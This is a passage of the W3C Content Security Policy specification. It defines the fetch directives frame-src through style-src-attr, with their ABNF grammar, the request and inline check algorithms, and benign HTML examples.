 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.5. `frame-src`

The [frame-src]
directive restricts the URLs which may be loaded into [child
navigables](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable). The syntax for the directive's name and value is
described by the following ABNF:

 directive-name = "frame-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: frame-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `frame-src`'s [source
list](#source-lists):

``` highlight
<iframe src="https://example.org/">
</iframe>
```

##### 6.1.5.1. `frame-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `frame-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.5.2. `frame-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `frame-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.6. `img-src`

The [img-src]
directive restricts the URLs from which image resources may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "img-src"
 directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request) which load images. More formally, this includes
[requests](https://fetch.spec.whatwg.org/#concept-request) whose
[destination](https://fetch.spec.whatwg.org/#concept-request-destination) is \"`image`\"
[\[FETCH\]](#biblio-fetch "Fetch Standard").

Given a page with the following
Content Security Policy:

 Content-Security-Policy: img-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `img-src`'s [source
list](#source-lists):

``` highlight
<img src="https://example.org/img">
```

##### 6.1.6.1. `img-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`, `img-src`
 and `policy` is \"`No`\", return \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.6.2. `img-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`, `img-src`
 and `policy` is \"`No`\", return \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.7. `manifest-src`

The [manifest-src] directive restricts the URLs from which application manifests
may be loaded
[\[APPMANIFEST\]](#biblio-appmanifest "Web Application Manifest").
The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "manifest-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: manifest-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `manifest-src`'s [source
list](#source-lists):

``` highlight
<link rel="manifest" href="https://example.org/manifest">
```

##### 6.1.7.1. `manifest-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `manifest-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.7.2. `manifest-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `manifest-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.8. `media-src`

The [media-src]
directive restricts the URLs from which video, audio, and associated
text track resources may be loaded. The syntax for the directive's name
and value is described by the following ABNF:

 directive-name = "media-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: media-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `media-src`'s [source
list](#source-lists):

``` highlight
<audio src="https://example.org/audio"></audio>
<video src="https://example.org/video">
 <track kind="subtitles" src="https://example.org/subtitles">
</video>
```

##### 6.1.8.1. `media-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `media-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.8.2. `media-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `media-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.9. `object-src`

The [object-src]
directive restricts the URLs from which plugin content may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "object-src"
 directive-value = serialized-source-list

Given a page with the following
Content Security Policy:

 Content-Security-Policy: object-src https://example.com/

Fetches for the following code will return a network errors, as the URL
provided do not match `object-src`'s [source
list](#source-lists):

``` highlight
<embed src="https://example.org/flash"></embed>
<object data="https://example.org/flash"></object>
```

If plugin content is loaded without an associated URL (perhaps an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) element lacks a
[`data`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data) attribute, but loads some default plugin based
on the specified `type`), it MUST be blocked if `object-src`'s value is
`'none'`, but will otherwise be allowed.

 The `object-src` directive acts upon any request made
on behalf of an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) or
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element) element. This includes requests which would
populate the [child
navigable](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable) generated by the former two (also including
navigations). This is true even when the data is semantically equivalent
to content which would otherwise be restricted by another directive,
such as an
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) element with a `text/html` MIME type.

 When a plugin resource is navigated to directly (that
is, as a [plugin](https://html.spec.whatwg.org/#plugin) inside a
[navigable](https://html.spec.whatwg.org/#navigable), and not as an embedded subresource via
[`embed`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element) or
[`object`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)), any
[policy](#content-security-policy-object) delivered along with that resource will be applied to
the resulting
[`Document`](https://dom.spec.whatwg.org/#document). This means, for instance, that developers can prevent
the execution of arbitrary resources as plugin content by delivering the
policy `object-src 'none'` along with a response. Given plugins\' power
(and the sometimes-interesting security model presented by Flash and
others), this could mitigate the risk of attack vectors like [Rosetta
Flash](https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/).

##### 6.1.9.1. `object-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `object-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

##### 6.1.9.2. `object-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `object-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.10. `script-src`

The [script-src]
directive restricts the locations from which scripts may be executed.
This includes not only URLs loaded directly into
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements, but also things like inline script blocks
and XSLT stylesheets
[\[XSLT\]](#biblio-xslt "XSL Transformations (XSLT) Version 1.0")
which can trigger script execution. The syntax for the directive's name
and value is described by the following ABNF:

 directive-name = "script-src"
 directive-value = serialized-source-list

The `script-src` directive acts as a default fallback for all
[script-like](https://fetch.spec.whatwg.org/#request-destination-script-like) destinations (including worker-specific destinations if
[`worker-src`](#worker-src) is not
present). Unless granularity is desired `script-src` should be used in
favor of [`script-src-attr`](#script-src-attr) and
[`script-src-elem`](#script-src-elem) as in most situations there is no particular reason to
have separate lists of permissions for inline event handlers and
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements.

The `script-src` directive governs six things:

1. Script
 [requests](https://fetch.spec.whatwg.org/#concept-request) MUST pass through [§ 4.1.2 Should request be
 blocked by Content Security
 Policy?](#should-block-request).

2. Script
 [responses](https://fetch.spec.whatwg.org/#concept-response) MUST pass through [§ 4.1.3 Should response to
 request be blocked by Content Security
 Policy?](#should-block-response).

3. Inline
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) blocks MUST pass through [§ 4.2.3 Should
 element's inline type behavior be blocked by Content Security
 Policy?](#should-block-inline). Their
 behavior will be blocked unless every policy allows inline script,
 either implicitly by not specifying a `script-src` (or
 `default-src`) directive, or explicitly, by specifying
 \"`unsafe-inline`\", a
 [nonce-source](#grammardef-nonce-source) or a
 [hash-source](#grammardef-hash-source) that matches the inline block.

4. The following JavaScript execution sinks are gated on the
 \"`unsafe-eval`\" and \"`trusted-types-eval`\" source expressions:

 - [`eval()`](https://tc39.github.io/ecma262#sec-eval-x)

 - [`Function()`](https://tc39.github.io/ecma262#sec-function-objects)

 - [`setTimeout()`](https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout) with an initial argument which is not callable.

 - [`setInterval()`](https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval) with an initial argument which is not callable.

 If a user agent implements non-standard sinks like
 `setImmediate()` or `execScript()`, they SHOULD also be gated on
 \"`unsafe-eval`\". Note: Since \"`unsafe-eval`\" acts as a global
 page flag,
 [`script-src-attr`](#script-src-attr) and
 [`script-src-elem`](#script-src-elem) are not used when performing this check, instead
 `script-src` (or it's fallback directive) is always used.

5. The following WebAssembly execution sinks are gated on the
 \"`wasm-unsafe-eval`\" or the \"`unsafe-eval`\" source expressions:

 - [`new WebAssembly.Module()`](https://webassembly.github.io/spec/js-api/#dom-module-module)

 - [`WebAssembly.compile()`](https://webassembly.github.io/spec/js-api/#dom-webassembly-compile)

 - [`WebAssembly.compileStreaming()`](https://webassembly.github.io/spec/web-api/#dom-webassembly-compilestreaming)

 - [`WebAssembly.instantiate()`](https://webassembly.github.io/spec/js-api/#dom-webassembly-instantiate)

 - [`WebAssembly.instantiateStreaming()`](https://webassembly.github.io/spec/web-api/#dom-webassembly-instantiatestreaming)

 the \"`wasm-unsafe-eval`\" source expression is the
 more specific source expression. In particular, \"`unsafe-eval`\"
 permits both compilation (and instantiation) of WebAssembly and, for
 example, the use of the \"`eval`\" operation in JavaScript. The
 \"`wasm-unsafe-eval`\" source expression only permits WebAssembly
 and does not affect JavaScript.

6. Navigation to `javascript:` URLs MUST pass through [§ 4.2.3 Should
 element's inline type behavior be blocked by Content Security
 Policy?](#should-block-inline). Such
 navigations will only execute script if every policy allows inline
 script, as per #3 above.

##### 6.1.10.1. `script-src` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing [§ 6.7.1.1 Script directives
 pre-request check](#script-pre-request) on `request`,
 this directive, and `policy`.

##### 6.1.10.2. `script-src` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing [§ 6.7.1.2 Script directives
 post-request check](#script-post-request) on `request`,
 `response`, this directive, and `policy`.

##### 6.1.10.3. `script-src` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Assert: `element` is not null or `type` is
 \"`navigation`\".

2. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

3. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

4. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source`, is
 \"`Does Not Match`\", return \"`Blocked`\".

5. Return \"`Allowed`\".

#### 6.1.11. `script-src-elem`

The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "script-src-elem"
 directive-value = serialized-source-list

The [script-src-elem] directive applies to all script requests and script blocks.
Attributes that execute script (inline event handlers) are controlled
via [`script-src-attr`](#script-src-attr).

As such, the following differences exist when comparing to `script-src`:

- `script-src-elem` applies to inline checks whose `|type|` is
 \"`script`\" and \"`navigation`\" (and is ignored for inline checks
 whose `|type|` is \"`script attribute`\").

- `script-src-elem`'s
 [value](#directive-value)
 is not used for JavaScript execution sink checks that are gated on the
 \"`unsafe-eval`\" check.

- `script-src-elem` is not used as a fallback for the `worker-src`
 directive. The `worker-src` checks still fall back on the `script-src`
 directive.

##### 6.1.11.1. `script-src-elem` Pre-request check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src-elem` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing [§ 6.7.1.1 Script directives
 pre-request check](#script-pre-request) on `request`,
 this directive, and `policy`.

##### 6.1.11.2. `script-src-elem` Post-request check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src-elem` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. Return the result of executing [§ 6.7.1.2 Script directives
 post-request check](#script-post-request) on `request`,
 `response`, this directive, and `policy`.

##### 6.1.11.3. `script-src-elem` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Assert: `element` is not null or `type` is
 \"`navigation`\".

2. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

3. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src-elem`, and `policy` is \"`No`\", return
 \"`Allowed`\".

4. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source` is
 \"`Does Not Match`\", return \"`Blocked`\".

5. Return \"`Allowed`\".

#### 6.1.12. `script-src-attr`

The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "script-src-attr"
 directive-value = serialized-source-list

The [script-src-attr] directive applies to event handlers and, if present, it will
override the `script-src` directive for relevant checks.

##### 6.1.12.1. `script-src-attr` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Assert: `element` is not null or `type` is
 \"`navigation`\".

2. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

3. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `script-src-attr` and `policy` is \"`No`\", return
 \"`Allowed`\".

4. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source`, is
 \"`Does Not Match`\", return \"`Blocked`\".

5. Return \"`Allowed`\".

#### 6.1.13. `style-src`

The [style-src]
directive restricts the locations from which style may be applied to a
[`Document`](https://dom.spec.whatwg.org/#document). The syntax for the directive's name and value is
described by the following ABNF:

 directive-name = "style-src"
 directive-value = serialized-source-list

The `style-src` directive governs several things:

1. Style
 [requests](https://fetch.spec.whatwg.org/#concept-request) MUST pass through [§ 4.1.2 Should request be
 blocked by Content Security
 Policy?](#should-block-request).
 This includes:

 1. Stylesheet requests originating from a
 [`link`](https://html.spec.whatwg.org/multipage/semantics.html#the-link-element) element.

 2. Stylesheet requests originating from the
 [`@import`](https://www.w3.org/TR/css-cascade-5/#at-ruledef-import) rule.

 3. Stylesheet requests originating from a `Link` HTTP response
 header field
 [\[RFC8288\]](#biblio-rfc8288 "Web Linking").

2. [Responses](https://fetch.spec.whatwg.org/#concept-response) to style requests MUST pass through [§ 4.1.3 Should
 response to request be blocked by Content Security
 Policy?](#should-block-response).

3. Inline
 [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element) blocks MUST pass through [§ 4.2.3 Should
 element's inline type behavior be blocked by Content Security
 Policy?](#should-block-inline). The
 styles will be blocked unless every policy allows inline style,
 either implicitly by not specifying a `style-src` (or `default-src`)
 directive, or explicitly, by specifying \"`unsafe-inline`\", a
 [nonce-source](#grammardef-nonce-source) or a
 [hash-source](#grammardef-hash-source) that matches the inline block.

4. The following CSS algorithms are gated on the `unsafe-eval` source
 expression:

 1. [insert a CSS
 rule](https://www.w3.org/TR/cssom-1/#insert-a-css-rule)

 2. [parse a CSS
 rule](https://www.w3.org/TR/cssom-1/#parse-a-css-rule),

 3. [parse a CSS declaration
 block](https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block)

 4. [parse a group of
 selectors](https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors)

 This would include, for example, all invocations of CSSOM's various
 `cssText` setters and `insertRule` methods
 [\[CSSOM\]](#biblio-cssom "CSS Object Model (CSSOM)")
 [\[HTML\]](#biblio-html "HTML Standard").

 (#issue-ba1a0a35) This needs to be better explained.
 [\[w3c/webappsec-csp Issue
 #212\]](https://github.com/w3c/webappsec-csp/issues/212)

##### 6.1.13.1. `style-src` Pre-request Check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

4. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

5. Return \"`Allowed`\".

##### 6.1.13.2. `style-src` Post-request Check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

4. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

5. Return \"`Allowed`\".

##### 6.1.13.3. `style-src` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source`, is
 \"`Does Not Match`\", return \"`Blocked`\".

4. Return \"`Allowed`\".

This directive's
[initialization](#directive-initialization) algorithm is as follows:

Do something interesting to the
execution context in order to lock down interesting CSSOM algorithms. I
don't think CSSOM gives us any hooks here, so let's work with them to
put something reasonable together.

#### 6.1.14. `style-src-elem`

The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "style-src-elem"
 directive-value = serialized-source-list

The [style-src-elem] directive governs the behaviour of styles except for styles
defined in inline attributes.

##### 6.1.14.1. `style-src-elem` Pre-request Check

This directive's [pre-request
check](#directive-pre-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request` and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src-elem` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

4. If the result of executing [§ 6.7.2.5 Does request match source
 list?](#match-request-to-source-list) on `request`, this
 directive's [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

5. Return \"`Allowed`\".

##### 6.1.14.2. `style-src-elem` Post-request Check

This directive's [post-request
check](#directive-post-request-check) is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, a
[response](https://fetch.spec.whatwg.org/#concept-response) `response`, and a
[policy](#content-security-policy-object) `policy`:

1. Let `name` be the result of executing [§ 6.8.1 Get the
 effective directive for request](#effective-directive-for-a-request)
 on `request`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src-elem` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.2.3 Does nonce match source
 list?](#match-nonce-to-source-list) on `request`'s
 [cryptographic nonce
 metadata](https://fetch.spec.whatwg.org/#concept-request-nonce-metadata) and this directive's
 [value](#directive-value) is \"`Matches`\", return \"`Allowed`\".

4. If the result of executing [§ 6.7.2.6 Does response to request match
 source list?](#match-response-to-source-list) on
 `response`, `request`, this directive's
 [value](#directive-value), and `policy`, is \"`Does Not Match`\",
 return \"`Blocked`\".

5. Return \"`Allowed`\".

##### 6.1.14.3. `style-src-elem` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

2. If the result of executing [§ 6.8.4 Should fetch directive
 execute](#should-directive-execute) on `name`,
 `style-src-elem` and `policy` is \"`No`\", return
 \"`Allowed`\".

3. If the result of executing [§ 6.7.3.3 Does element match source list
 for type and source?](#match-element-to-source-list) on
 `element`, this directive's
 [value](#directive-value), `type`, and `source`, is
 \"`Does Not Match`\", return \"`Blocked`\".

4. Return \"`Allowed`\".

#### 6.1.15. `style-src-attr`

The syntax for the directive's name and value is described by the
following ABNF:

 directive-name = "style-src-attr"
 directive-value = serialized-source-list

The [style-src-attr] directive governs the behaviour of style attributes.

##### 6.1.15.1. `style-src-attr` Inline Check

This directive's [inline
check](#directive-inline-check) algorithm is as follows:

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a string `type`, a
[policy](#content-security-policy-object) `policy` and a string `source`:

1. Let `name` be the result of executing [§ 6.8.2 Get the
 effective directive for inline
 checks](#effective-directive-for-inline-check) on `type`.

2. If the result of executing [§ 6.8.4 Should fetch directive
